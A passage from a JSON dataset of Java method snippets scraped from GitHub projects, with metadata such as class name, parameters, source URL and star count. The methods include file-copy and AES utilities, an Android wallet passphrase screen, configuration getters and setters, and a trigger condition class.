void init(FilterConfig fConfig) throws ServletException {\n\t}", "url": "https://raw.githubusercontent.com/marcoseduardoss/mini-mvc/master/demos/001-crud-books-mvc-servlets-jstl-jpa/src/main/java/br/me/crudbooks/web/security/AccessControlFilter.java", "stars": "2", "class_props": {"extends": null, "implements": ["Filter"], "modifiers": ["public"]}}, {"id": 56236, "method_name": "copyFileUsingFileChannels", "class_name": "Tools", "params": ["File", "File"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void copyFileUsingFileChannels(File source, File dest) throws IOException {\n        FileChannel inputChannel = null;\n        FileChannel outputChannel = null;\n        try {\n            inputChannel = new FileInputStream(source).getChannel();\n            outputChannel = new FileOutputStream(dest).getChannel();\n            outputChannel.transferFrom(inputChannel, 0, inputChannel.size());\n        } finally {\n            assert inputChannel != null;\n            inputChannel.close();\n            assert outputChannel != null;\n            outputChannel.close();\n        }\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/Tools.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56237, "method_name": "rand", "class_name": "Tools", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int rand(int min, int max) {\n        return random.nextInt(max) % (max - min + 1) + min;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/Tools.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56238, "method_name": "flowAutoShow", "class_name": "Tools", "params": ["double"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String flowAutoShow(double value) {\n\t\t// Math.round \u65b9\u6cd5\u63a5\u6536 float \u548c double \u7c7b\u578b,\u5982\u679c\u53c2\u6570\u662f int \u7684\u8bdd,\u4f1a\u5f3a\u8f6c\u4e3a float,\u8fd9\u4e2a\u65f6\u5019\u8c03\u7528\u8be5\u65b9\u6cd5\u65e0\u610f\u4e49\n        int kb = 1024;\n        int mb = 1048576;\n        int gb = 1073741824;\n\t\tdouble abs = Math.abs(value);\n\t\tif (abs > gb) {\n            return Math.round(value / gb) + \"GB\";\n\t\t} else if (abs > mb) {\n            return Math.round(value / mb) + \"MB\";\n\t\t} else if (abs > kb) {\n            return Math.round(value / kb) + \"KB\";\n        }\n        return Math.round(value) + \"\";\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/Tools.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56239, "method_name": "enAes", "class_name": "Tools", "params": ["String", "String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String enAes(String data, String key) throws Exception {\n        Cipher cipher = Cipher.getInstance(\"AES\");\n        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(\"UTF-8\"), \"AES\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);\n        byte[] encryptedBytes = cipher.doFinal(data.getBytes());\n        return new BASE64Encoder().encode(encryptedBytes);\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/Tools.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56240, "method_name": "deAes", "class_name": "Tools", "params": ["String", "String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String deAes(String data, String key) throws Exception {\n        Cipher cipher = Cipher.getInstance(\"AES\");\n        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(\"UTF-8\"), \"AES\");\n        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);\n        byte[] cipherTextBytes = new BASE64Decoder().decodeBuffer(data);\n        byte[] decValue = cipher.doFinal(cipherTextBytes);\n        return new String(decValue);\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/Tools.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56241, "method_name": "isNumber", "class_name": "Tools", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isNumber(String str) {\n        // Pattern pattern=Pattern.compile(\"[0-9]*\");\n        // return pattern.matcher(str).matches();\n        if (null != str && 0 != str.trim().length() && str.matches(\"\\\\d*\")) {\n            return true;\n        }\n\n        return false;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/Tools.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56242, "method_name": "setView", "class_name": "PassphraseFragment", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int setView() {\n        return R.layout.passphrase;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/PassphraseFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 56243, "method_name": "init", "class_name": "PassphraseFragment", "params": ["View"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void init(View view) {\n        super.init(view);\n        mBinding.toolbar.setNavigationOnClickListener(v -> {\n            if (mActivity instanceof SetupVaultActivity) {\n                mActivity.finish();\n            } else {\n                Keyboard.hide(mActivity, mBinding.input1);\n                navigateUp();\n            }\n        });\n        mBinding.setPassphrase1(passphrase1);\n        mBinding.setPassphrase2(passphrase2);\n        setFilterSpace(mBinding.input1);\n        setFilterSpace(mBinding.input2);\n        mBinding.confirm.setOnClickListener(v -> confirmInput());\n        Observable.OnPropertyChangedCallback callback = new Observable.OnPropertyChangedCallback() {\n            @Override\n            public void onPropertyChanged(Observable sender, int propertyId) {\n                String input1 = passphrase1.get();\n                String input2 = passphrase2.get();\n                if (input2.length() >= input1.length() && !input1.equals(input2)) {\n                    mBinding.inputHint.setText(R.string.passphrase_not_match);\n                    mBinding.inputHint.setTextColor(Color.RED);\n                } else {\n                    mBinding.inputHint.setText(R.string.passphrase_hint3);\n                    mBinding.inputHint.setTextColor(Color.WHITE);\n                }\n            }\n        };\n        passphrase1.addOnPropertyChangedCallback(callback);\n        passphrase2.addOnPropertyChangedCallback(callback);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/PassphraseFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 56244, "method_name": "confirmInput", "class_name": "PassphraseFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void confirmInput() {\n        ModalDialog dialog = new ModalDialog();\n        ConfirmModalBinding binding = DataBindingUtil.inflate(LayoutInflater.from(mActivity),\n                R.layout.confirm_modal, null, false);\n        binding.text.setText(R.string.passphrase_confirm_modal_title);\n        binding.text2.setText(R.string.passphrase_confirm_modal_hint);\n        binding.close.setOnClickListener(v -> dialog.dismiss());\n        binding.confirm.setText(R.string.confirm);\n        dialog.setBinding(binding);\n        binding.confirm.setOnClickListener(v -> {\n            Keyboard.hide(mActivity, mBinding.input1);\n            dialog.dismiss();\n            updatePassphrase();\n        });\n        dialog.show(mActivity.getSupportFragmentManager(), \"\");\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/PassphraseFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 56245, "method_name": "updatePassphrase", "class_name": "PassphraseFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void updatePassphrase() {\n        viewModel.setPassword(getArguments().getString(PASSWORD));\n        viewModel.updatePassphrase(passphrase1.get());\n        subscribeVaultState(viewModel);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/PassphraseFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 56246, "method_name": "setFilterSpace", "class_name": "PassphraseFragment", "params": ["EditText"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setFilterSpace(EditText editText) {\n        InputFilter letterFilter = (source, start, end, dest, dstart, dend) -> {\n            if (SPACE.equals(source.toString())) {\n                return \"\";\n            } else {\n                return null;\n            }\n        };\n\n        InputFilter lengthFilter = new InputFilter.LengthFilter(MAX_LENGTH);\n        editText.setFilters(new InputFilter[]{letterFilter, lengthFilter});\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/PassphraseFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 56247, "method_name": "initData", "class_name": "PassphraseFragment", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initData(Bundle savedInstanceState) {\n\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/PassphraseFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 56248, "method_name": "subscribeVaultState", "class_name": "PassphraseFragment", "params": ["SetupVaultViewModel"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void subscribeVaultState(SetupVaultViewModel viewModel) {\n        viewModel.getVaultCreateState().observe(this, state -> {\n            if (state == VAULT_STATE_CREATING) {\n                showModal();\n            } else if (state == VAULT_STATE_CREATED) {\n                Utilities.setVaultCreated(mActivity);\n                Utilities.setVaultId(mActivity, viewModel.getVaultId());\n                Utilities.setCurrentBelongTo(mActivity,\n                        TextUtils.isEmpty(passphrase1.get()) ? \"main\" : \"hidden\");\n\n                Runnable onComplete = () -> {\n                    Bundle data = new Bundle();\n                    data.putBoolean(IS_SETUP_VAULT, false);\n                    data.putBoolean(IS_SET_PASSPHRASE, true);\n                    if (dialog != null && dialog.getDialog() != null\n                            && dialog.getDialog().isShowing()) {\n                        dialog.dismiss();\n                    }\n                    if (TextUtils.isEmpty(passphrase1.get())) {\n                        startActivity(new Intent(mActivity, MainActivity.class));\n                    } else {\n                        Navigation.findNavController(mActivity, R.id.nav_host_fragment)\n                                .navigate(R.id.action_to_manageCoinFragment, data);\n                    }\n                };\n                List<CoinEntity> coins = PresetData.generateCoins(mActivity);\n                viewModel.presetData(coins, onComplete);\n\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/PassphraseFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 56249, "method_name": "showModal", "class_name": "PassphraseFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void showModal() {\n        CreateVaultModalBinding binding = DataBindingUtil.inflate(LayoutInflater.from(mActivity),\n                R.layout.create_vault_modal, null, false);\n        dialog = ModalDialog.newInstance();\n        dialog.setBinding(binding);\n        dialog.show(mActivity.getSupportFragmentManager(), \"\");\n        String[] steps = mActivity.getResources().getStringArray(R.array.create_vault_step);\n        binding.step.setText(steps[0]);\n        Handler handler = new Handler();\n        Runnable runnable = new Runnable() {\n            int i = 0;\n\n            @Override\n            public void run() {\n                try {\n                    handler.postDelayed(this, 8000);\n                    binding.step.setText(steps[i]);\n                    i++;\n                    if (i > 4) {\n                        handler.removeCallbacks(this);\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                    System.out.println(\"exception...\");\n                }\n            }\n        };\n        handler.post(runnable);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/PassphraseFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 56250, "method_name": "onDestroy", "class_name": "ShellItemRendererBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onDestroy ()\n\t{\n\t\tn_onDestroy ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellItemRendererBase.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public", "abstract"]}}, {"id": 56251, "method_name": "n_onDestroy", "class_name": "ShellItemRendererBase", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onDestroy ();\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellItemRendererBase.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public", "abstract"]}}, {"id": 56252, "method_name": "monodroidAddReference", "class_name": "ShellItemRendererBase", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellItemRendererBase.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public", "abstract"]}}, {"id": 56253, "method_name": "monodroidClearReferences", "class_name": "ShellItemRendererBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellItemRendererBase.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public", "abstract"]}}, {"id": 56254, "method_name": "getHeartBeatAvailInterval", "class_name": "MachineLoadConf", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getHeartBeatAvailInterval(){\n        return heartBeatAvailInterval;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/route/MachineLoadConf.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56255, "method_name": "getCpuWeight", "class_name": "MachineLoadConf", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCpuWeight(){\n        return cpuWeight;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/route/MachineLoadConf.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56256, "method_name": "getMemWeight", "class_name": "MachineLoadConf", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMemWeight(){\n        return memWeight;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/route/MachineLoadConf.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56257, "method_name": "getCpuThreshold", "class_name": "MachineLoadConf", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double getCpuThreshold() {\n        return cpuThreshold;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/route/MachineLoadConf.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56258, "method_name": "setCpuThreshold", "class_name": "MachineLoadConf", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCpuThreshold(double cpuThreshold) {\n        this.cpuThreshold = cpuThreshold;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/route/MachineLoadConf.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56259, "method_name": "getMemThreshold", "class_name": "MachineLoadConf", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double getMemThreshold() {\n        return memThreshold;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/route/MachineLoadConf.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56260, "method_name": "setMemThreshold", "class_name": "MachineLoadConf", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMemThreshold(double memThreshold) {\n        this.memThreshold = memThreshold;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/route/MachineLoadConf.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56261, "method_name": "getValueType", "class_name": "VideoOptionModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getValueType() {\n        return valueType;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/VideoOptionModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56262, "method_name": "setValueType", "class_name": "VideoOptionModel", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValueType(int valueType) {\n        this.valueType = valueType;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/VideoOptionModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56263, "method_name": "getCategory", "class_name": "VideoOptionModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCategory() {\n        return category;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/VideoOptionModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56264, "method_name": "setCategory", "class_name": "VideoOptionModel", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCategory(int category) {\n        this.category = category;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/VideoOptionModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56265, "method_name": "getValueInt", "class_name": "VideoOptionModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getValueInt() {\n        return valueInt;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/VideoOptionModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56266, "method_name": "setValueInt", "class_name": "VideoOptionModel", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValueInt(int valueInt) {\n        this.valueInt = valueInt;\n        valueType = VALUE_TYPE_INT;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/VideoOptionModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56267, "method_name": "getName", "class_name": "VideoOptionModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/VideoOptionModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56268, "method_name": "setName", "class_name": "VideoOptionModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/VideoOptionModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56269, "method_name": "getValueString", "class_name": "VideoOptionModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getValueString() {\n        return valueString;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/VideoOptionModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56270, "method_name": "setValueString", "class_name": "VideoOptionModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValueString(String valueString) {\n        this.valueString = valueString;\n        valueType = VALUE_TYPE_STRING;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/VideoOptionModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56271, "method_name": "saveToken", "class_name": "PrefOneSignal", "params": ["Context", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void saveToken(Context context, String token)\n    {\n        SharedPreferences sharedPref = context.getSharedPreferences(\n                context.getString(R.string.preference_file_name),\n                MODE_PRIVATE);\n\n        // write to the shared preference\n        SharedPreferences.Editor editor = sharedPref.edit();\n        editor.putString(TAG_ONE_SIGNAL_TOKEN, token);\n        editor.apply();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/PushOneSignal/PrefOneSignal.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56272, "method_name": "getToken", "class_name": "PrefOneSignal", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getToken(Context context)\n    {\n        if(context==null)\n        {\n            return null;\n        }\n\n        SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_file_name), MODE_PRIVATE);\n        return sharedPref.getString(TAG_ONE_SIGNAL_TOKEN, null);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/PushOneSignal/PrefOneSignal.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56273, "method_name": "saveLastToken", "class_name": "PrefOneSignal", "params": ["Context", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void saveLastToken(Context context, String token)\n    {\n        SharedPreferences sharedPref = context.getSharedPreferences(\n                context.getString(R.string.preference_file_name),\n                MODE_PRIVATE);\n\n        // write to the shared preference\n        SharedPreferences.Editor editor = sharedPref.edit();\n        editor.putString(TAG_LAST_TOKEN_ONE_SIGNAL, token);\n        editor.apply();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/PushOneSignal/PrefOneSignal.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56274, "method_name": "getLastToken", "class_name": "PrefOneSignal", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getLastToken(Context context)\n    {\n        if(context==null)\n        {\n            return null;\n        }\n\n        SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_file_name), MODE_PRIVATE);\n        return sharedPref.getString(TAG_LAST_TOKEN_ONE_SIGNAL, null);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/PushOneSignal/PrefOneSignal.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56275, "method_name": "index", "class_name": "LogController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ModelAndView", "snippet": "    public ModelAndView index() {\n        return new ModelAndView(\"sys/log\");\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/modules/sys/controller/LogController.java", "stars": "10", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 56276, "method_name": "listData", "class_name": "LogController", "params": ["Log"], "throws": null, "modifiers": ["public"], "return_type": "R", "snippet": "    public R listData(Log log) {\n        Page<Log> page = logService.listLogPage(log);\n        return R.ok(page);\n    }", "url": "https://raw.githubusercontent.com/IzzyPrime/Admin/master/src/main/java/com/kalvin/kvf/modules/sys/controller/LogController.java", "stars": "10", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 56277, "method_name": "setCheckerLoader", "class_name": "Condition", "params": ["CheckerTypeLoader"], "throws": null, "modifiers": ["synchronized", "public", "static"], "return_type": "void", "snippet": "  public synchronized static void setCheckerLoader(final CheckerTypeLoader loader) {\n    Condition.checkerLoader = loader;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/Condition.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56278, "method_name": "fromJson", "class_name": "Condition", "params": ["Object"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "Condition", "snippet": "  public static Condition fromJson(final Object obj) throws Exception {\n    if (checkerLoader == null) {\n      throw new Exception(\"Condition Checker loader not initialized!\");\n    }\n\n    final Map<String, Object> jsonObj = (HashMap<String, Object>) obj;\n    Condition cond = null;\n\n    try {\n      final Map<String, ConditionChecker> checkers =\n          new HashMap<>();\n      final List<Object> checkersJson = (List<Object>) jsonObj.get(\"checkers\");\n      for (final Object oneCheckerJson : checkersJson) {\n        final Map<String, Object> oneChecker =\n            (HashMap<String, Object>) oneCheckerJson;\n        final String type = (String) oneChecker.get(\"type\");\n        final ConditionChecker ck =\n            checkerLoader.createCheckerFromJson(type,\n                oneChecker.get(\"checkerJson\"));\n        checkers.put(ck.getId(), ck);\n      }\n      final String expr = (String) jsonObj.get(\"expression\");\n      final Long nextCheckTime = Long.valueOf((String) jsonObj.get(\"nextCheckTime\"));\n\n      cond = new Condition(checkers, expr, nextCheckTime);\n\n    } catch (final Exception e) {\n      e.printStackTrace();\n      logger.error(\"Failed to recreate condition from json.\", e);\n      throw new Exception(\"Failed to recreate condition from json.\", e);\n    }\n\n    return cond;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/Condition.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56279, "method_name": "getNextCheckTime", "class_name": "Condition", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long getNextCheckTime() {\n    return this.nextCheckTime;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/Condition.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56280, "method_name": "getCheckers", "class_name": "Condition", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,ConditionChecker>", "snippet": "  public Map<String, ConditionChecker> getCheckers() {\n    return this.checkers;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/Condition.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56281, "method_name": "setCheckers", "class_name": "Condition", "params": ["Map<String,ConditionChecker>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setCheckers(final Map<String, ConditionChecker> checkers) {\n    this.checkers = checkers;\n    for (final ConditionChecker checker : checkers.values()) {\n      this.context.set(checker.getId(), checker);\n    }\n    updateNextCheckTime();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/Condition.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56282, "method_name": "updateNextCheckTime", "class_name": "Condition", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void updateNextCheckTime() {\n    long time = Long.MAX_VALUE;\n    for (final ConditionChecker checker : this.checkers.values()) {\n      time = Math.min(time, checker.getNextCheckTime());\n    }\n    this.nextCheckTime = time;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/Condition.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56283, "method_name": "resetCheckers", "class_name": "Condition", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void resetCheckers() {\n    for (final ConditionChecker checker : this.checkers.values()) {\n      checker.reset();\n    }\n    